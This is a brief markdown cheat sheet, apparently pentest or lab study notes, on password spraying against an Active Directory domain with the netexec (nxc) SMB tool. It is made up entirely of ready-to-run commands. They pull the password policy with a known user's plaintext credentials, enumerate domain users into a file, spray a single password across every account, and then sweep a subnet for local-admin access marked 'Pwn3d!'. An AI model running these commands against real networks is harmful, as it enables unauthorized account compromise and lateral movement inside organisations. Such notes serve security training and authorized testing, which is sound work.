# Password Spraying

```bash
# Get password policy
nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --pass-pol

# Enumerate domain users
nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > users.txt

# Spray all users with one password
nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>

# Check if credentials grant local admin anywhere
nxc smb -u users.txt -p 'Nexus123!' -d corp.com 192.168.242.0/24
# Look for "Pwn3d!" in output
```
